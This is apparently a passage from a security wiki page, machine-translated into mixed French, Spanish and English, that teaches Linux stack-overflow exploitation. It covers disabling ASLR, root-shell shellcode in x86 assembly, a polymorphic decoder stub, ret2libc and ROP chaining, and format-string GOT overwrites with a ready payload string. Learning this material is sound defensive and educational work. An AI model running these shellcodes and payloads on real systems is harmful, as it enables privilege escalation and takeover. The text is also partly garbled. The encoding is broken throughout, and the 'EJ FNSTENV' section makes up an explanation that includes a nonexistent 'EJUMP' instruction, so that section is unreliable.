# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**D√©sactiver la randomisation (ASLR) GLOBALE (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
R√©activer la randomisation GLOBALE: echo 2 > /proc/sys/kernel/randomize\_va\_space

**D√©sactiver pour une ex√©cution** (ne n√©cessite pas de root):\
setarch \`arch\` -R ./exemple arguments\
setarch \`uname -m\` -R ./exemple arguments

**D√©sactiver la protection d'ex√©cution sur la pile**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemple.c -o exemple

**Fichier core**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Texte**\
**Donn√©es**\
**BSS**\
**Heap**

**Pile**

**Section BSS**: Variables globales ou statiques non initialis√©es
```
static int i;
```
**Section DATA**: Variables globales ou statiques initialis√©es
```
int i = 5;
```
**Section TEXT**: Code instructions (opcodes)

**Section HEAP**: Dynamically allocated buffers (malloc(), calloc(), realloc())

**Section STACK**: The stack (passed arguments, environment strings (env), local variables...)

## **1. D√âBORDEMENTS DE PILE**

> D√©bordement de tampon, d√©passement de tampon, d√©passement de pile, √©crasement de pile

Segmentation fault or segment violation: When attempting to access a memory address that has not been assigned to the process.

To obtain the address of a function within a program, you can do:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Appel √† sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Voir les interruptions du kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter la syscall

**nasm -f elf assembly.asm** ‚Äî> Nous renvoie un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nous donne un ex√©cutable form√© par le code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et extraire les opcodes

**V√©rifier que la shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
            void (*fp) (void);
            fp = (void *)shellcode;
            fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**.

Lors de la cr√©ation de shellcodes, un astuce peut √™tre utilis√©e. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et met √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons ins√©r√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EX **ASTUCE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax            
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Utilisation de l'exploit EJ avec le Stack (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

La technique EJ FNSTENV est une technique d'exploitation de d√©passement de tampon qui consiste √† √©craser la structure de cadre de pile (stack frame) d'une fonction pour contr√¥ler l'ex√©cution du programme. Cette technique est souvent utilis√©e pour ex√©cuter du code malveillant sur une machine cible. 

Le nom EJ FNSTENV vient des instructions utilis√©es pour exploiter cette technique : EJUMP (saut conditionnel), FNSTENV (sauvegarde de l'√©tat de la pile) et JMP (saut inconditionnel). 

Pour exploiter cette technique, l'attaquant doit trouver une vuln√©rabilit√© de d√©passement de tampon dans le programme cible. Ensuite, l'attaquant doit √©crire un shellcode qui sera ex√©cut√© une fois que la structure de cadre de pile sera √©cras√©e. Le shellcode peut √™tre utilis√© pour ouvrir une porte d√©rob√©e, ex√©cuter des commandes √† distance ou effectuer d'autres actions malveillantes. 

Il est important de noter que cette technique est de plus en plus difficile √† exploiter en raison des mesures de s√©curit√© mises en place dans les syst√®mes d'exploitation modernes. Les d√©veloppeurs peuvent √©galement utiliser des techniques de codage s√©curis√© pour r√©duire les risques de vuln√©rabilit√©s de d√©passement de tampon.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature plac√©e dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphes**

Il s'agit de shells chiffr√©s qui ont un petit code qui les d√©chiffre et saute dessus, en utilisant le truc de Call-Pop. Voici un exemple de chiffrement de C√©sar :
```
global _start
_start:
            jmp short magic
init:
            pop     esi
            xor      ecx, ecx
            mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
            sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
            sub     cl, 1
            jnz       desc
            jmp     short sc
magic:
            call init
sc:
            ;Aqu√≠ va el shellcode
```
1. **Attaquer le pointeur de cadre (EBP)**

Utile dans une situation o√π nous pouvons modifier l'EBP mais pas l'EIP.

Il est connu que lorsqu'une fonction se termine, le code assembleur suivant est ex√©cut√©:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De cette fa√ßon, si l'on peut modifier l'EBP en sortant d'une fonction (fvuln) qui a √©t√© appel√©e par une autre fonction, lorsque la fonction qui a appel√© fvuln se termine, son EIP peut √™tre modifi√©.

Dans fvuln, on peut introduire un faux EBP qui pointe vers un endroit o√π se trouve l'adresse de la shellcode + 4 (il faut ajouter 4 pour le pop). Ainsi, en sortant de la fonction, la valeur de &(\&Shellcode)+4 sera plac√©e dans ESP, avec le pop, 4 sera soustrait de ESP et il pointera vers l'adresse de la shellcode lors de l'ex√©cution du ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + remplissage + &(\&Shellcode)+4

**Exploit Off-by-One**\
Il est possible de modifier uniquement le byte le moins significatif de l'EBP. On peut effectuer une attaque comme celle d√©crite pr√©c√©demment, mais la m√©moire qui stocke l'adresse de la shellcode doit partager les 3 premiers bytes avec l'EBP.

## **4. M√©thodes return to Libc**

M√©thode utile lorsque la pile n'est pas ex√©cutable ou laisse un tampon tr√®s petit pour √™tre modifi√©.

L'ASLR fait en sorte que chaque fois que les fonctions sont charg√©es √† des positions diff√©rentes de la m√©moire. Par cons√©quent, cette m√©thode peut ne pas √™tre efficace dans ce cas. Pour les serveurs distants, comme le programme est constamment ex√©cut√© √† la m√™me adresse, elle peut √™tre utile.

* **cdecl (C declaration)** Met les arguments sur la pile et nettoie la pile apr√®s la sortie de la fonction
* **stdcall (standard call)** Met les arguments sur la pile et c'est la fonction appel√©e qui la nettoie
* **fastcall** Met les deux premiers arguments dans les registres et le reste sur la pile

On met l'adresse de l'instruction system de libc et on lui passe comme argument la cha√Æne "/bin/sh", g√©n√©ralement √† partir d'une variable d'environnement. De plus, on utilise l'adresse de la fonction exit pour que, une fois que la shell n'est plus n√©cessaire, le programme se termine sans probl√®me (et sans √©crire de journaux).

**export SHELL=/bin/sh**

Pour trouver les adresses dont nous avons besoin, on peut regarder dans **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Donne l'adresse de toutes les fonctions utilis√©es par le programme lorsqu'il est charg√©\
(Dans un start ou un autre point d'arr√™t): **x/500s $esp** ‚Äî> On cherche ici la cha√Æne /bin/sh

Une fois que nous avons ces adresses, l'**exploit** serait :

"A" \* DISTANCE EBP + 4 (EBP : il peut s'agir de 4 "A" bien que ce soit mieux si c'est le vrai EBP pour √©viter les erreurs de segmentation) + Adresse de **system** (elle √©crasera l'EIP) + Adresse de **exit** (lorsque system(‚Äú/bin/sh‚Äù) se termine, cette fonction sera appel√©e car les 4 premiers octets de la pile sont trait√©s comme l'adresse suivante de l'EIP √† ex√©cuter) + Adresse de ‚Äú**/bin/sh**‚Äù (ce sera le param√®tre pass√© √† system)

De cette fa√ßon, l'EIP sera √©cras√© avec l'adresse de system qui recevra la cha√Æne "/bin/sh" comme param√®tre et, une fois termin√©e, ex√©cutera la fonction exit().

Il est possible de se retrouver dans la situation o√π un byte d'une adresse d'une fonction est nul ou un espace (\x20). Dans ce cas, on peut d√©sassembler les adresses pr√©c√©dant cette fonction car il y a probablement plusieurs NOPs qui nous permettront d'appeler l'un d'entre eux plut√¥t que la fonction directement (par exemple avec > x/8i system-4).

Cette m√©thode fonctionne car en appelant une fonction comme system en utilisant l'opcode **ret** au lieu de **call**, la fonction comprend que les 4 premiers octets seront l'adresse **EIP** √† laquelle revenir.

Une technique int√©ressante avec cette m√©thode consiste √† appeler **strncpy()** pour d√©placer une charge utile de la pile vers le tas et ensuite utiliser **gets()** pour ex√©cuter cette charge utile.

Une autre technique int√©ressante est l'utilisation de **mprotect()** qui permet d'attribuer les autorisations souhait√©es √† n'importe quelle partie de la m√©moire. Elle fonctionne ou fonctionnait sur BDS, MacOS et OpenBSD, mais pas sur Linux (qui emp√™che l'attribution simultan√©e d'autorisations d'√©criture et d'ex√©cution). Avec cette attaque, il serait possible de r√©tablir la pile comme ex√©cutable.

**Encha√Ænement de fonctions**

En se basant sur la technique pr√©c√©dente, cette forme d'exploit consiste en :\
Remplissage + \&Fonction1 + \&pop;ret; + \&arg\_fun1 + \&Fonction2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

De cette fa√ßon, on peut encha√Æner des fonctions √† appeler. De plus, si l'on veut utiliser des fonctions avec plusieurs arguments, on peut mettre les arguments n√©cessaires (par exemple 4) et mettre les 4 arguments et chercher une adresse √† un endroit avec des opcodes : pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Encha√Ænement en falsifiant les frames (encha√Ænement des EBPs)**

Il s'agit de profiter du pouvoir de manipulation de l'EBP pour encha√Æner l'ex√©cution de plusieurs fonctions √† travers l'EBP et "leave;ret"

REMPLISSAGE

* On place dans l'EBP un EBP faux qui pointe vers : 2√®me EBP\_faux + la fonction √† ex√©cuter : (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* Dans l'EIP, on met l'adresse d'une fonction &(leave;ret)

On commence la shellcode avec l'adresse de la partie suivante de la shellcode, par exemple : 2√®me EBP\_faux + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

le 2√®me EBP serait : 3√®me EBP\_faux + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Cette shellcode peut √™tre r√©p√©t√©e ind√©finiment dans les parties de la m√©moire auxquelles on a acc√®s, de sorte qu'on obtiendra une shellcode facilement divisible en petits morceaux de m√©moire.

(L'encha√Ænement de l'ex√©cution de fonctions m√©lange les vuln√©rabilit√©s pr√©c√©demment vues d'EBP et de ret2lib)

## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utile lorsque l'on ne peut pas mettre une adresse de la pile dans l'EIP (on v√©rifie que l'EIP ne contient pas 0xbf) ou lorsque l'on ne peut pas calculer l'emplacement de la shellcode. Mais, la fonction vuln√©rable accepte un param√®tre (la shellcode ira ici).

De cette fa√ßon, en changeant l'EIP par une adresse de **ret**, la prochaine adresse sera charg√©e (qui est l'adresse du premier argument de la fonction). C'est-√†-dire que la shellcode sera charg√©e.

L'exploit serait : SHELLCODE + Remplissage (jusqu'√† EIP) + **\&ret** (les octets suivants de la pile pointent vers le d√©but de la shellcode car l'adresse du param√®tre pass√© est mise sur la pile)

Il semble que des fonctions comme **strncpy** une fois termin√©es suppriment de la pile l'adresse o√π la shellcode √©tait stock√©e, rendant cette technique impossible. C'est-√†-dire que l'adresse qu'ils passent √† la fonction en tant qu'argument (celle qui stocke la shellcode) est modifi√©e par un 0x00, de sorte que lorsqu'on appelle le deuxi√®me **ret**, on trouve un 0x00 et le programme meurt.
```
        **Ret2PopRet**
```
If we don't have control over the first argument but we do over the second or third, we can overwrite EIP with an address to pop-ret or pop-pop-ret, depending on what we need.

**Murat's Technique**

In Linux, all programs are mapped starting at 0xbfffffff.

By examining how the stack of a new process is constructed in Linux, an exploit can be developed so that the program is launched in an environment whose only variable is the shellcode. The address of this can then be calculated as: addr = 0xbfffffff - 4 - strlen(FULL\_executable\_name) - strlen(shellcode)

This way, the address where the environment variable with the shellcode is located can be easily obtained.

This can be done thanks to the execle function, which allows creating an environment that only has the desired environment variables.

**Jump to ESP: Windows Style**

Since ESP is always pointing to the beginning of the stack, this technique consists of replacing EIP with the address of a call to **jmp esp** or **call esp**. This way, the shellcode is saved after overwriting EIP since after executing the **ret**, ESP will be pointing to the next address, right where the shellcode has been saved.

If ASLR is not active in Windows or Linux, **jmp esp** or **call esp** stored in some shared object can be called. If ASLR is active, it could be searched within the vulnerable program itself.

In addition, being able to place the shellcode after the corruption of EIP instead of in the middle of the stack allows push or pop instructions executed in the middle of the function to not touch the shellcode (which could happen if it were placed in the middle of the function's stack).

In a very similar way, if we know that a function returns the address where the shellcode is stored, we can call **call eax** or **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) or borrowed code chunks**

The code chunks that are invoked are known as gadgets.

This technique consists of chaining different function calls using the **ret2libc** technique and the use of **pop,ret**.

In some processor architectures, each instruction is a set of 32 bits (MIPS for example). However, in Intel, instructions are of variable size and several instructions can share a set of bits, for example:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contains the bytes 0xffe4 which also translate to: **jmp \*%esp**

This way, some instructions that are not even in the original program can be executed.

**ROPgadget.py** helps us find values in binaries.

This program also serves to create **payloads**. You can give it the library from which you want to extract the ROPs and it will generate a payload in Python to which you give the address where said library is located and the payload is ready to be used as shellcode. In addition, since it uses system calls, it does not actually execute anything on the stack but only saves addresses of ROPs that will be executed through **ret**. To use this payload, the payload must be called using a **ret** instruction.

**Integer overflows**

This type of overflow occurs when a variable is not prepared to support a number as large as the one passed to it, possibly due to confusion between signed and unsigned variables, for example:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le second est la cha√Æne.

Si nous passons un nombre n√©gatif comme premier param√®tre, il sortira que len < 256 et nous passerons ce filtre, et de plus strlen(buffer) sera inf√©rieur √† l, car l est unsigned int et sera tr√®s grand.

Ce type de d√©bordements ne vise pas √† √©crire quelque chose dans le processus du programme, mais √† contourner des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne sait pas quelle valeur peut prendre une variable non initialis√©e et il pourrait √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur qu'une variable de la fonction pr√©c√©dente prenait et que celle-ci soit contr√¥l√©e par l'attaquant.

## **Cha√Ænes de format**

En C, **`printf`** est une fonction qui peut √™tre utilis√©e pour **imprimer** une cha√Æne de caract√®res. Le **premier param√®tre** que cette fonction attend est le **texte brut avec les formateurs**. Les **param√®tres suivants** attendus sont les **valeurs** √† **substituer** aux **formateurs** du texte brut.

La vuln√©rabilit√© appara√Æt lorsqu'un **texte d'attaquant est mis en tant que premier argument** de cette fonction. L'attaquant pourra cr√©er une **entr√©e sp√©ciale en abusant des capacit√©s de la cha√Æne de format printf** pour **√©crire n'importe quelle donn√©e √† n'importe quelle adresse**. De cette mani√®re, il pourra **ex√©cuter du code arbitraire**.

Formateurs:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **√©crit** le **nombre d'octets √©crits** √† l'**adresse indiqu√©e. √âcrire** autant d'**octets** que le nombre hexad√©cimal que nous **devons √©crire** est la fa√ßon dont vous pouvez **√©crire n'importe quelle donn√©e**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### \*\*GOT (Global Offsets Table) / PLT (\*\*Procedure Linkage Table)

Ceci est la table qui contient l'**adresse** des **fonctions externes** utilis√©es par le programme.

Obtenez l'adresse de cette table avec: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Remarquez comment apr√®s **chargement** de l'**ex√©cutable** dans GEF, vous pouvez **voir** les **fonctions** qui sont dans le **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (3).png>)

En utilisant GEF, vous pouvez **d√©marrer** une **session de d√©bogage** et ex√©cuter **`got`** pour voir la table got:

![](<../../.gitbook/assets/image (621).png>)

Dans un binaire, le GOT a les **adresses des fonctions ou** de la **section PLT** qui chargera l'adresse de la fonction. L'objectif de cette exploitation est de **remplacer l'entr√©e GOT** d'une fonction qui sera ex√©cut√©e plus tard **avec** l'**adresse** de la **PLT de la fonction system**. Id√©alement, vous **remplacez** le **GOT** d'une **fonction** qui est **appel√©e avec des param√®tres contr√¥l√©s par vous** (vous pourrez donc contr√¥ler les param√®tres envoy√©s √† la fonction syst√®me).

Si **`system`** **n'est pas utilis√©** par le script, la fonction syst√®me **n'aura pas d'entr√©e dans le GOT**. Dans ce sc√©nario, vous devrez **d'abord divulguer l'adresse** de la fonction `system`.

La **Table de liaison de proc√©dures** est une table **en lecture seule** dans le fichier ELF qui stocke tous les **symboles n√©cessaires qui ont besoin d'une r√©solution**. Lorsqu'une de ces fonctions est appel√©e, le **GOT** **redirige** le **flux** vers le **PLT** pour qu'il puisse **r√©soudre** l'**adresse** de la fonction et l'√©crire sur le GOT.\
Ensuite, la **prochaine fois** qu'un appel est effectu√© √† cette adresse, la **fonction** est **appel√©e directement** sans avoir besoin de la r√©soudre.

Vous pouvez voir les adresses PLT avec **`objdump -j .plt -d ./vuln_binary`**

### **Flux d'exploitation**

Comme expliqu√© pr√©c√©demment, l'objectif va √™tre de **remplacer l'adresse** d'une **fonction** dans la table **GOT** qui sera appel√©e plus tard. Id√©alement, nous pourrions d√©finir l'**adresse sur un shellcode** situ√© dans une section ex√©cutable, mais il est tr√®s probable que vous ne puissiez pas √©crire un shellcode dans une section ex√©cutable.\
Une option diff√©rente est donc de **remplacer une fonction** qui **re√ßoit** ses **arguments** de l'**utilisateur** et de la **pointer** vers la **fonction `system`**.

Pour √©crire l'adresse, g√©n√©ralement 2 √©tapes sont effectu√©es: Vous **√©crivez d'abord 2 octets** de l'adresse, puis les 2 autres. Pour ce faire, **`$hn`** est utilis√©.

**HOB** est appel√© pour les 2 octets sup√©rieurs de l'adresse\
**LOB** est appel√© pour les 2 octets inf√©rieurs de l'adresse

Ainsi, en raison du fonctionnement de la cha√Æne de formatage, vous devez **d'abord √©crire le plus petit** de \[HOB, LOB] et ensuite l'autre.

Si HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Mod√®le d'exploitation de la cha√Æne de formatage**

Vous pouvez trouver un **mod√®le** pour exploiter le GOT en utilisant des cha√Ænes de formatage ici:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentiellement, il s'agit d'une structure avec des **fonctions qui seront appel√©es** avant que le programme ne se termine. C'est int√©ressant si vous pouvez appeler votre **shellcode en sautant √† une adresse**, ou dans des cas o√π vous devez revenir √† la fonction main pour **exploiter la cha√Æne de formatage une deuxi√®me fois**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
 8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela ne cr√©era pas de boucle √©ternelle car lorsque vous revenez √† la fonction principale, le canari le remarquera, la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e. Ainsi, avec cela, vous pourrez avoir une ex√©cution suppl√©mentaire de la vuln√©rabilit√©.

### Cha√Ænes de format pour extraire du contenu

Une cha√Æne de format peut √©galement √™tre utilis√©e pour extraire du contenu de la m√©moire du programme. Par exemple, dans la situation suivante, il y a une variable locale dans la pile pointant vers un drapeau. Si vous trouvez o√π se trouve en m√©moire le pointeur vers le drapeau, vous pouvez faire en sorte que printf acc√®de √† cette adresse et imprime le drapeau :

Ainsi, le drapeau est √† **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le pointeur vers le drapeau est dans le 8√®me param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Ainsi, en acc√©dant au 8√®me param√®tre, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'apr√®s l'exploitation pr√©c√©dente et en r√©alisant que vous pouvez extraire du contenu, vous pouvez d√©finir des pointeurs vers printf dans la section o√π l'ex√©cutable est charg√© et le vider enti√®rement !

### DTOR

{% hint style="danger" %}
De nos jours, il est tr√®s rare de trouver un binaire avec une section dtor.
{% endhint %}

Les destructeurs sont des fonctions qui sont ex√©cut√©es avant que le programme ne se termine. Si vous parvenez √† √©crire une adresse vers un shellcode dans `__DTOR_END__`, cela sera ex√©cut√© avant la fin des programmes. Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
G√©n√©ralement, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc, si vous voyez simplement ces valeurs, cela signifie qu'il n'y a **aucune fonction enregistr√©e**. Alors, **√©crasez** le **`00000000`** avec l'**adresse** du **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de format pour les d√©bordements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e **vers** une **variable**. Par cons√©quent, vous pouvez abuser de la **mise en forme** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira **44B+"AAAA" dans la variable**, ce qui peut causer un d√©bordement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es en tant que param√®tres**. Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** de la **fonction principale**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour qu'elle pointe vers un shellcode, par exemple, vous **prendrez le contr√¥le** du **processus**, mais cela est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et enfin l'adresse vers laquelle elle pointe n'est pas l'adresse des fonctions, mais est **crypt√©e avec XOR** et des d√©placements avec une **cl√© al√©atoire**. Ainsi, actuellement, ce vecteur d'attaque n'est **pas tr√®s utile au moins sur x86** et **x64\_86**.\
La fonction de **cryptage** est **`PTR_MANGLE`**. **D'autres architectures** telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas le cryptage** car il **retourne la m√™me chose** qu'il a re√ßue en entr√©e. Ainsi, ces architectures seraient attaquables par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe, c'est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreur ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc s'il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **surcharge** du **VPtr** est r√©alis√©e, elle pourrait √™tre **modifi√©e** pour **pointer** vers une m√©thode fictive de sorte que l'ex√©cution d'une fonction aille au shellcode.

## **Mesures pr√©ventives et √©vasions**

**ASLR pas si al√©atoire**

PaX plonge l'espace d'adressage du processus en 3 groupes :

Code et donn√©es initialis√©s et non initialis√©s : .text, .data et .bss ‚Äî> 16 bits d'entropie dans la variable delta\_exec, cette variable est initialis√©e al√©atoirement avec chaque processus et est ajout√©e aux adresses initiales

